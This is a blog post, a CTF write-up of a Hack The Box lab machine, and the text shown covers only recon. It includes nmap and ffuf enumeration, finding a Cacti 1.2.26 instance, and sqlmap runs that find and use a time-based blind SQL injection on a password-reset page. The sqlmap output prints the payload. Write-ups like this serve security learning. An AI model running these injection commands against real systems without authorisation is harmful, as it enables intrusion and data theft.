<!doctype html><html lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#478CCF name=theme-color><title>Writeup of MonitorsThree - F4doli's blog</title><link href=https://f4doli.github.io/Blog/htb-monitorsthree/ rel=canonical><link href=https://f4doli.github.io/favicon.png rel=icon type=image/png><link href=https://f4doli.github.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><style>:root{--primary-color:#478ccf;--primary-color-alpha:#6f839633;--contrast-color:#fff}</style><link href=https://f4doli.github.io/style.css rel=stylesheet><link href=https://f4doli.github.io/custom.css rel=stylesheet><script>document.addEventListener(`DOMContentLoaded`,(()=>{let c=`div`,d=`active`;var b=(async(a,b)=>{let c=a.querySelector(`code`);let e=c.innerText;await navigator.clipboard.writeText(e);b.classList.add(d);setTimeout(()=>{b.classList.remove(d)},800)});let a=document.querySelectorAll(`pre[class^='language-']`);a.forEach(a=>{if(navigator.clipboard){let d=document.createElement(`span`);let e=a.getAttribute(`data-lang`);d.innerHTML=e;let f=document.createElement(`i`);f.classList.add(`icon`);let g=document.createElement(`button`);g.setAttribute(`title`,`Copy code`);g.appendChild(f);let h=document.createElement(c);h.classList.add(`header`);h.appendChild(g);h.appendChild(d);let i=document.createElement(c);i.classList.add(`pre-container`);i.appendChild(h);a.parentNode.insertBefore(i,a);i.appendChild(a);g.addEventListener(`click`,async()=>{await b(a,h)})}})}))</script><script>var initSearch=(()=>{let k=0,j=`flex`,i=`none`,h=``;var a=document.getElementById(`search-bar`);var b=document.getElementById(`search-results`);var c=10;var d={bool:`AND`,fields:{title:{boost:2},body:{boost:1}}};var e=h;var f;var g=(async()=>{if(f===undefined){f=fetch(`https://f4doli.github.io/search_index.en.json`).then((async(a)=>await elasticlunr.Index.load(await a.json())))};let a=await f;return a});a.addEventListener(`keyup`,debounce((async()=>{var f=a.value.trim();if(f===e){return};b.style.display=f===h?i:j;b.innerHTML=h;e=f;if(f===h){return};var l=(await g()).search(f,d);if(l.length===k){b.style.display=i;return};for(var m=k;m<Math.min(l.length,c);m++){b.innerHTML+=formatSearchResultItem(l[m],f.split(` `))}}),150));window.addEventListener(`click`,(a=>{if(b.style.display==j&&!b.contains(a.target)){b.style.display=i}}))});var toggleSearch=(()=>{var a=document.getElementById(`search-container`);var b=document.getElementById(`search-bar`);a.classList.toggle(`active`);b.toggleAttribute(`disabled`)});var makeTeaser=((a,b)=>{let y=2,z=0,A=1;var c=40;var d=y;var e=8;var f=30;var g=b.map((a=>elasticlunr.stemmer(a.toLowerCase())));var h=!1;var i=z;var j=[];var k=a.toLowerCase().split(`. `);for(var l in k){var m=k[l].split(` `);var n=e;for(var o in m){var p=m[o];if(p.length>z){for(var q in g){if(elasticlunr.stemmer(p).startsWith(g[q])){n=c;h=!0}};j.push([p,n,i]);n=d};i+=p.length;i+=A};i+=A};if(j.length===z){return a};var r=[];var s=Math.min(j.length,f);var t=z;for(var l=z;l<s;l++){t+=j[l][A]};r.push(t);for(var l=z;l<j.length- s;l++){t-=j[l][A];t+=j[l+ s][A];r.push(t)};var u=z;if(h){var v=z;for(var l=r.length- A;l>=z;l--){if(r[l]>v){v=r[l];u=l}}};var w=[];var x=j[u][y];for(var l=u;l<u+ s;l++){var p=j[l];if(x<p[y]){w.push(a.substring(x,p[y]));x=p[y]};if(p[A]===c){w.push(`<strong>`)};x=p[y]+ p[z].length;w.push(a.substring(p[y],x));if(p[A]===c){w.push(`</strong>`)}};w.push(`…`);return w.join(``)});var debounce=((a,b)=>{var c;return function(){var d=this;var e=arguments;clearTimeout(c);c=setTimeout((()=>{c=null;a.apply(d,e)}),b)}});var formatSearchResultItem=((a,b)=>`<div class="item">`+ `<a href="${a.ref}">${a.doc.title}</a>`+ `<div>${makeTeaser(a.doc.body,b)}</div>`+ `</div>`);if(document.readyState===`complete`||document.readyState!==`loading`&&!document.documentElement.doScroll){initSearch()}else{document.addEventListener(`DOMContentLoaded`,initSearch)}</script><script src=https://f4doli.github.io/elasticlunr.min.js></script><script src=https://f4doli.github.io/theme-switcher.js></script><meta content="F4doli's blog" property=og:site_name><meta content="Writeup of MonitorsThree - F4doli's blog" property=og:title><meta content=https://f4doli.github.io/Blog/htb-monitorsthree/ property=og:url><meta content="A medium machine from Hack The Box" property=og:description><meta content=https://f4doli.github.io/card.png property=og:image><meta content=summary_large_image property=twitter:card><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main id=main-content tabindex=0> Skip to main content </a><ul><li id=home><a href=https://f4doli.github.io> <i class=icon></i>F4doli's blog</a><li><a href=https://f4doli.github.io/Blog/>Blog</a><li><a href=https://f4doli.github.io/Archives/>Archives</a><li id=search><button onclick=toggleSearch() title=Search><i class=icon></i></button><li id=theme-switcher><details><summary title=Theme><i class=icon></i></summary> <ul><li><button onclick="switchTheme('light')" title="Switch to light theme" id=theme-light><i class=icon></i></button><li><button onclick="switchTheme('dark')" title="Switch to dark theme" id=theme-dark><i class=icon></i></button><li><button onclick="switchTheme('system')" title="Use system theme" id=theme-system><i class=icon></i></button></ul></details></ul></nav><div id=search-container><label class=hidden for=search-bar>Search</label><input placeholder="Search for…" autocomplete=off disabled id=search-bar type=search><div id=search-results></div></div></header><div class=container id=main><article><div id=banner-container><img class=full-bleed id=banner src=https://f4doli.github.io/Blog/htb-monitorsthree/monitorsthree.jpg></div><h1 class=banner-margin>Writeup of MonitorsThree</h1><small> <time datetime=" 2024-09-04T00:00:00+00:00" pubdate>Published on September 04, 2024</time><span> • By F4doli</span><span> • </span> <span>11 minutes read</span></small><h2>Table of Contents</h2><ul><li><a href=https://f4doli.github.io/Blog/htb-monitorsthree/#recon>Recon</a><li><a href=https://f4doli.github.io/Blog/htb-monitorsthree/#foothold>Foothold</a><li><a href=https://f4doli.github.io/Blog/htb-monitorsthree/#privilege-escalation>Privilege Escalation</a></ul><h2 id=recon>Recon</h2><p>As always, let’s begin with a nmap scan and see if we can discover some interesting ports<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>nmap -sV -sC -p- -A --max-retries</span><span> 2</span><span style=color:#bf616a> -n</span><span> 10.129.105.144
</span><span>
</span><span style=color:#bf616a>Starting</span><span> Nmap 7.93 ( https://nmap.org ) </span><span style=color:#bf616a>at</span><span> 2024-08-25 10:01 CEST
</span><span style=color:#bf616a>Warning:</span><span> 10.129.105.144 giving up on port because retransmission cap hit (2)</span><span style=color:#96b5b4>.
</span><span style=color:#bf616a>Nmap</span><span> scan report for 10.129.105.144
</span><span style=color:#bf616a>Host</span><span> is up (0.029s latency)</span><span style=color:#96b5b4>.
</span><span style=color:#bf616a>Not</span><span> shown: 65496 closed tcp ports (reset)</span><span style=color:#bf616a>,</span><span> 37 filtered tcp ports (no-response)
</span><span style=color:#bf616a>PORT</span><span>   STATE SERVICE VERSION
</span><span style=color:#bf616a>22/tcp</span><span> open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; </span><span style=color:#bf616a>protocol</span><span> 2.0)
</span><span>| </span><span style=color:#bf616a>ssh-hostkey: 
</span><span>|   </span><span style=color:#bf616a>256</span><span> 86f87d6f4291bb897291af72f301ff5b (ECDSA)
</span><span>|</span><span style=color:#bf616a>_</span><span>  256 50f9ed8e73649eaaf6089514f0a60d57 (ED25519)
</span><span style=color:#bf616a>80/tcp</span><span> open  http    nginx 1.18.0 (Ubuntu)
</span><span>|</span><span style=color:#bf616a>_http-title:</span><span> Did not follow redirect to http://monitorsthree.htb/
</span><span>|</span><span style=color:#bf616a>_http-server-header:</span><span> nginx/1.18.0 (Ubuntu)
</span><span style=color:#bf616a>No</span><span> exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ )</span><span style=color:#96b5b4>.
</span><span style=color:#bf616a>TCP/IP</span><span> fingerprint:
</span><span style=color:#bf616a>OS:SCAN</span><span>(V=7.93%</span><span style=color:#bf616a>E</span><span>=4%</span><span style=color:#bf616a>D</span><span>=8/25%</span><span style=color:#bf616a>OT</span><span>=22%</span><span style=color:#bf616a>CT</span><span>=1%</span><span style=color:#bf616a>CU</span><span>=30232%</span><span style=color:#bf616a>PV</span><span>=Y%</span><span style=color:#bf616a>DS</span><span>=2%</span><span style=color:#bf616a>DC</span><span>=T%</span><span style=color:#bf616a>G</span><span>=Y%</span><span style=color:#bf616a>TM</span><span>=66CAE50
</span><span style=color:#bf616a>OS:D%P</span><span>=</span><span style=color:#a3be8c>aarch64-unknown-linux-gnu</span><span>)</span><span style=color:#bf616a>SEQ</span><span>(SP=106%</span><span style=color:#bf616a>GCD</span><span>=1%</span><span style=color:#bf616a>ISR</span><span>=10B%</span><span style=color:#bf616a>TI</span><span>=Z%</span><span style=color:#bf616a>CI</span><span>=Z%</span><span style=color:#bf616a>II</span><span>=I%</span><span style=color:#bf616a>TS
</span><span style=color:#bf616a>OS:</span><span>=</span><span style=color:#a3be8c>A</span><span>)</span><span style=color:#bf616a>OPS</span><span>(O1=M53CST11NW7%</span><span style=color:#bf616a>O2</span><span>=M53CST11NW7%</span><span style=color:#bf616a>O3</span><span>=M53CNNT11NW7%</span><span style=color:#bf616a>O4</span><span>=M53CST11NW7%</span><span style=color:#bf616a>O5</span><span>=M
</span><span style=color:#bf616a>OS:53CST11NW7%O6</span><span>=</span><span style=color:#a3be8c>M53CST11</span><span>)</span><span style=color:#bf616a>WIN</span><span>(W1=FE88%</span><span style=color:#bf616a>W2</span><span>=FE88%</span><span style=color:#bf616a>W3</span><span>=FE88%</span><span style=color:#bf616a>W4</span><span>=FE88%</span><span style=color:#bf616a>W5</span><span>=FE88%</span><span style=color:#bf616a>W6</span><span>=FE
</span><span style=color:#bf616a>OS:88</span><span>)</span><span style=color:#bf616a>ECN</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>W</span><span>=FAF0%</span><span style=color:#bf616a>O</span><span>=M53CNNSNW7%</span><span style=color:#bf616a>CC</span><span>=Y%</span><span style=color:#bf616a>Q</span><span>=)</span><span style=color:#bf616a>T1</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>S</span><span>=O%</span><span style=color:#bf616a>A</span><span>=
</span><span style=color:#bf616a>OS:S+%F</span><span>=</span><span style=color:#a3be8c>AS</span><span>%</span><span style=color:#bf616a>RD</span><span style=color:#a3be8c>=0</span><span>%</span><span style=color:#bf616a>Q</span><span style=color:#a3be8c>=</span><span>)</span><span style=color:#bf616a>T2</span><span>(R=N)</span><span style=color:#bf616a>T3</span><span>(R=N)</span><span style=color:#bf616a>T4</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>W</span><span>=0%</span><span style=color:#bf616a>S</span><span>=A%</span><span style=color:#bf616a>A</span><span>=Z%</span><span style=color:#bf616a>F</span><span>=R%</span><span style=color:#bf616a>O</span><span>=%</span><span style=color:#bf616a>RD</span><span>=0%</span><span style=color:#bf616a>Q
</span><span style=color:#bf616a>OS:</span><span>=)</span><span style=color:#bf616a>T5</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>W</span><span>=0%</span><span style=color:#bf616a>S</span><span>=Z%</span><span style=color:#bf616a>A</span><span>=S+%</span><span style=color:#bf616a>F</span><span>=AR%</span><span style=color:#bf616a>O</span><span>=%</span><span style=color:#bf616a>RD</span><span>=0%</span><span style=color:#bf616a>Q</span><span>=)</span><span style=color:#bf616a>T6</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>W</span><span>=0%</span><span style=color:#bf616a>S</span><span>=A
</span><span style=color:#bf616a>OS:%A</span><span>=</span><span style=color:#a3be8c>Z</span><span>%</span><span style=color:#bf616a>F</span><span style=color:#a3be8c>=R</span><span>%</span><span style=color:#bf616a>O</span><span style=color:#a3be8c>=</span><span>%</span><span style=color:#bf616a>RD</span><span style=color:#a3be8c>=0</span><span>%</span><span style=color:#bf616a>Q</span><span style=color:#a3be8c>=</span><span>)</span><span style=color:#bf616a>T7</span><span>(R=Y%</span><span style=color:#bf616a>DF</span><span>=Y%</span><span style=color:#bf616a>T</span><span>=40%</span><span style=color:#bf616a>W</span><span>=0%</span><span style=color:#bf616a>S</span><span>=Z%</span><span style=color:#bf616a>A</span><span>=S+%</span><span style=color:#bf616a>F</span><span>=AR%</span><span style=color:#bf616a>O</span><span>=%</span><span style=color:#bf616a>RD</span><span>=0%</span><span style=color:#bf616a>Q</span><span>=)</span><span style=color:#bf616a>U1</span><span>(R=Y
</span><span style=color:#bf616a>OS:%DF</span><span>=</span><span style=color:#a3be8c>N</span><span>%</span><span style=color:#bf616a>T</span><span style=color:#a3be8c>=40</span><span>%</span><span style=color:#bf616a>IPL</span><span style=color:#a3be8c>=164</span><span>%</span><span style=color:#bf616a>UN</span><span style=color:#a3be8c>=0</span><span>%</span><span style=color:#bf616a>RIPL</span><span style=color:#a3be8c>=G</span><span>%</span><span style=color:#bf616a>RID</span><span style=color:#a3be8c>=G</span><span>%</span><span style=color:#bf616a>RIPCK</span><span style=color:#a3be8c>=G</span><span>%</span><span style=color:#bf616a>RUCK</span><span style=color:#a3be8c>=G</span><span>%</span><span style=color:#bf616a>RUD</span><span style=color:#a3be8c>=G</span><span>)</span><span style=color:#bf616a>IE</span><span>(R=Y%</span><span style=color:#bf616a>DFI</span><span>=N%</span><span style=color:#bf616a>T
</span><span style=color:#bf616a>OS:</span><span>=</span><span style=color:#a3be8c>40</span><span>%</span><span style=color:#bf616a>CD</span><span style=color:#a3be8c>=S</span><span>)
</span><span>
</span><span style=color:#bf616a>Network</span><span> Distance: 2 hops
</span><span style=color:#bf616a>Service</span><span> Info: OS: Linux; </span><span style=color:#bf616a>CPE:</span><span> cpe:/o:linux:linux_kernel
</span><span>
</span><span style=color:#bf616a>TRACEROUTE</span><span> (using port 8888/tcp)
</span><span style=color:#bf616a>HOP</span><span> RTT      ADDRESS
</span><span style=color:#bf616a>1</span><span>   31.09 ms 10.10.14.1
</span><span style=color:#bf616a>2</span><span>   31.24 ms 10.129.105.144
</span><span>
</span><span style=color:#bf616a>OS</span><span> and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span style=color:#bf616a>Nmap</span><span> done: 1 IP address (1 host up) </span><span style=color:#bf616a>scanned</span><span> in 46.53 seconds
</span></code></pre><p><br> After adding the virtual hosts to our hosts file, we can start to enumerate virtual hosts<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>ffuf -c -w </span><span>`</span><span style=color:#bf616a>fzf-wordlists</span><span>`</span><span style=color:#bf616a> -u </span><span>"</span><span style=color:#a3be8c>http://monitorsthree.htb/</span><span>"</span><span style=color:#bf616a> -H </span><span>"</span><span style=color:#a3be8c>Host: FUZZ.monitorsthree.htb</span><span>"</span><span style=color:#bf616a> -fs</span><span> 13560
</span><span>
</span><span>        </span><span style=color:#bf616a>/</span><span>'</span><span style=color:#a3be8c>___\  /</span><span>'</span><span style=color:#bf616a>___</span><span style=color:#96b5b4>\ </span><span>          /'</span><span style=color:#a3be8c>___\       
</span><span style=color:#a3be8c>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span><span style=color:#a3be8c>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span><span style=color:#a3be8c>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span><span style=color:#a3be8c>         \ \_\   \ \_\  \ \____/  \ \_\       
</span><span style=color:#a3be8c>          \/_/    \/_/   \/___/    \/_/       
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>       v2.1.0-dev
</span><span style=color:#a3be8c>________________________________________________
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c> :: Method           : GET
</span><span style=color:#a3be8c> :: URL              : http://monitorsthree.htb/
</span><span style=color:#a3be8c> :: Wordlist         : FUZZ: /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt
</span><span style=color:#a3be8c> :: Header           : Host: FUZZ.monitorsthree.htb
</span><span style=color:#a3be8c> :: Follow redirects : false
</span><span style=color:#a3be8c> :: Calibration      : false
</span><span style=color:#a3be8c> :: Timeout          : 10
</span><span style=color:#a3be8c> :: Threads          : 40
</span><span style=color:#a3be8c> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span><span style=color:#a3be8c> :: Filter           : Response size: 13560
</span><span style=color:#a3be8c>________________________________________________
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
</span><span style=color:#a3be8c>:: Progress: [114441/114441] :: Job [1/1] :: 1342 req/sec :: Duration: [0:01:36] :: Errors: 0 :
</span></code></pre><p><br> If we go on this link, we land on a login page of cacti. In the source code of the page, we see a version of cacti<pre class=language-html data-lang=html style=color:#c0c5ce;background-color:#2b303b><code class=language-html data-lang=html><span><</span><span style=color:#bf616a>script </span><span style=color:#d08770>type</span><span>='</span><span style=color:#a3be8c>text/javascript</span><span>'>
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>cactiVersion</span><span>='</span><span style=color:#a3be8c>1.2.26</span><span>';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>cactiServerOS</span><span>='</span><span style=color:#a3be8c>unix</span><span>';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>cactiAction</span><span>='';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>theme</span><span>='</span><span style=color:#a3be8c>modern</span><span>';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>refreshIsLogout</span><span>=</span><span style=color:#d08770>true</span><span>;
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>refreshPage</span><span>='</span><span style=color:#a3be8c>/cacti/logout.php?action=timeout</span><span>';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>refreshMSeconds</span><span>=</span><span style=color:#d08770>1440000</span><span>;
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>urlPath</span><span>='</span><span style=color:#a3be8c>/cacti/</span><span>';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>previousPage</span><span>='';
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>sessionMessage</span><span>=[];
</span><span>	</span><span style=color:#b48ead>var </span><span style=color:#bf616a>csrfMagicToken</span><span>='</span><span style=color:#a3be8c>sid:6fea398c0eca1681b4760e90ca7ca6c7ab14c010,1724593050</span><span>';
</span><span>&LT/</span><span style=color:#bf616a>script</span><span>>
</span></code></pre><p><br> After a long time of enumeration, I have found an SQLi on the page where we can reset the password<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>sqlmap -u</span><span> http://monitorsthree.htb/forgot_password.php</span><span style=color:#bf616a> --data</span><span>="</span><span style=color:#a3be8c>username=test</span><span>"      
</span><span>        </span><span style=color:#bf616a>___
</span><span>       </span><span style=color:#bf616a>__H__
</span><span> </span><span style=color:#bf616a>___</span><span> ___</span><span style=color:#b48ead>[</span><span>.</span><span style=color:#b48ead>]</span><span>_____ ___ ___  {1.8.4.7#dev}
</span><span>|</span><span style=color:#bf616a>_</span><span> -| </span><span style=color:#96b5b4>. </span><span style=color:#b48ead>[</span><span>(</span><span style=color:#b48ead>]     </span><span>| </span><span style=color:#bf616a>.</span><span>'</span><span style=color:#a3be8c>| . |
</span><span style=color:#a3be8c>|___|_  ["]_|_|_|__,|  _|
</span><span style=color:#a3be8c>      |_|V...       |_|   https://sqlmap.org
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user</span><span>'</span><span style=color:#bf616a>s</span><span> responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span><span>
</span><span style=color:#bf616a>[*]</span><span> starting @ 17:31:41 /2024-08-25/
</span><span>
</span><span style=color:#bf616a>[17:31:42] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing connection to the target URL
</span><span style=color:#bf616a>got</span><span> a 302 redirect to '</span><span style=color:#a3be8c>http://monitorsthree.htb/forgot_password.php</span><span>'. Do you want to follow? </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>redirect</span><span> is a result of a POST request. Do you want to resend original POST data to a new location? </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>you</span><span> have not declared cookie(s)</span><span style=color:#bf616a>,</span><span> while server wants to set its own ('</span><span style=color:#a3be8c>PHPSESSID=u5of7iso67d...1f20njfjdg</span><span>')</span><span style=color:#96b5b4>.</span><span> Do you want to use those </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>[17:31:48] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing if the target URL content is stable
</span><span style=color:#bf616a>[17:31:48] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> POST parameter '</span><span style=color:#a3be8c>username</span><span>' does not appear to be dynamic
</span><span style=color:#bf616a>[17:31:48] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> heuristic (basic) </span><span style=color:#bf616a>test</span><span> shows that POST parameter '</span><span style=color:#a3be8c>username</span><span>' might not be injectable
</span><span style=color:#bf616a>[17:31:48] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing for SQL injection on POST parameter '</span><span style=color:#a3be8c>username</span><span>'
</span><span style=color:#bf616a>[17:31:48] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>AND boolean-based blind - WHERE or HAVING clause</span><span>'
</span><span style=color:#bf616a>[17:31:49] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Boolean-based blind - Parameter replace (original value)</span><span>'
</span><span style=color:#bf616a>[17:31:50] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><span>'
</span><span style=color:#bf616a>[17:31:53] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>PostgreSQL AND error-based - WHERE or HAVING clause</span><span>'
</span><span style=color:#bf616a>[17:31:54] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</span><span>'
</span><span style=color:#bf616a>[17:31:56] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Oracle AND error-based - WHERE or HAVING clause (XMLType)</span><span>'
</span><span style=color:#bf616a>[17:31:57] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Generic inline queries</span><span>'
</span><span style=color:#bf616a>[17:31:57] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>PostgreSQL > 8.1 stacked queries (comment)</span><span>'
</span><span style=color:#bf616a>[17:31:57] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> time-based comparison requires larger statistical model, please wait. (done)                                                          
</span><span style=color:#bf616a>[17:31:58] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Microsoft SQL Server/Sybase stacked queries (comment)</span><span>'
</span><span style=color:#bf616a>[17:31:59] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)</span><span>'
</span><span style=color:#bf616a>[17:32:00] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing '</span><span style=color:#a3be8c>MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span><span>'
</span><span style=color:#bf616a>[17:32:52] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> POST parameter '</span><span style=color:#a3be8c>username</span><span>' appears to be '</span><span style=color:#a3be8c>MySQL >= 5.0.12 AND time-based blind (query SLEEP)</span><span>' injectable
</span></code></pre><p><br> Honestly, I dont have the skills to do it manually, so I enumerated the database only with SQLmap. I wanted to know the current db, it can be interesting to enumerate it further<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>sqlmap -u</span><span> http://monitorsthree.htb/forgot_password.php</span><span style=color:#bf616a> --data</span><span>="</span><span style=color:#a3be8c>username=*</span><span>"</span><span style=color:#bf616a> --dbms</span><span>=mysql</span><span style=color:#bf616a> --current-db
</span><span>        </span><span style=color:#bf616a>___
</span><span>       </span><span style=color:#bf616a>__H__                                                                                                                                                
</span><span> </span><span style=color:#bf616a>___</span><span> ___</span><span style=color:#b48ead>[</span><span>.</span><span style=color:#b48ead>]</span><span>_____ ___ ___  {1.8.4.7#dev}                                                                                                                     
</span><span>|</span><span style=color:#bf616a>_</span><span> -| </span><span style=color:#96b5b4>. </span><span style=color:#b48ead>[</span><span>(</span><span style=color:#b48ead>]     </span><span>| </span><span style=color:#bf616a>.</span><span>'</span><span style=color:#a3be8c>| . |                                                                                                                                   
</span><span style=color:#a3be8c>|___|_  [</span><span>'</span><span style=color:#bf616a>]_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>__,</span><span>|  </span><span style=color:#bf616a>_</span><span>|                                                                                                                                   
</span><span>      |</span><span style=color:#bf616a>_</span><span>|</span><span style=color:#bf616a>V...       </span><span>|</span><span style=color:#bf616a>_</span><span>|   </span><span style=color:#bf616a>https://sqlmap.org                                                                                                                
</span><span>
</span><span style=color:#bf616a>[!]</span><span> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span><span style=color:#a3be8c>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>[*] starting @ 17:40:57 /2024-08-25/
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>custom injection marker (</span><span>'*'</span><span style=color:#a3be8c>) found in POST body. Do you want to process it? [Y/n/q] Y
</span><span style=color:#a3be8c>[17:41:00] [INFO] testing connection to the target URL
</span><span style=color:#a3be8c>got a 302 redirect to </span><span>'http://monitorsthree.htb/forgot_password.php'</span><span style=color:#a3be8c>. Do you want to follow? [Y/n] Y
</span><span style=color:#a3be8c>redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
</span><span style=color:#a3be8c>you have not declared cookie(s), while server wants to set its own (</span><span>'PHPSESSID=7536kn5bnq5...qlese1shen'</span><span style=color:#a3be8c>). Do you want to use those [Y/n] Y
</span><span style=color:#a3be8c>sqlmap resumed the following injection point(s) from stored session:
</span><span style=color:#a3be8c>---
</span><span style=color:#a3be8c>Parameter: #1* ((custom) POST)
</span><span style=color:#a3be8c>    Type: time-based blind
</span><span style=color:#a3be8c>    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
</span><span style=color:#a3be8c>    Payload: username=</span><span>' AND (SELECT 7658 FROM (SELECT(SLEEP(5)))</span><span style=color:#bf616a>HuDg</span><span>) </span><span style=color:#bf616a>AND </span><span>'</span><span style=color:#a3be8c>wNqd</span><span>'='</span><span style=color:#a3be8c>wNqd
</span><span style=color:#a3be8c>---
</span><span style=color:#a3be8c>[17:41:05] [INFO] testing MySQL
</span><span style=color:#a3be8c>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option </span><span>'--time-sec'</span><span style=color:#a3be8c>)? [Y/n] Y
</span><span style=color:#a3be8c>[17:41:51] [INFO] confirming MySQL
</span><span style=color:#a3be8c>[17:41:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
</span><span style=color:#a3be8c>[17:42:42] [INFO] adjusting time delay to 2 seconds due to good response times
</span><span style=color:#a3be8c>[17:42:42] [INFO] the back-end DBMS is MySQL
</span><span style=color:#a3be8c>web server operating system: Linux Ubuntu
</span><span style=color:#a3be8c>web application technology: PHP, Nginx 1.18.0
</span><span style=color:#a3be8c>back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
</span><span style=color:#a3be8c>[17:42:52] [INFO] fetching current database
</span><span style=color:#a3be8c>[17:42:52] [INFO] retrieved: monitorsthree_
</span><span style=color:#a3be8c>db                                                                                                                                                          
</span><span style=color:#a3be8c>current database: </span><span>'monitorsthree_db'                                                                                                                        
</span><span style=color:#a3be8c>[17:52:42] [INFO] fetched data logged to text files under </span><span>'/root/.local/share/sqlmap/output/monitorsthree.htb'
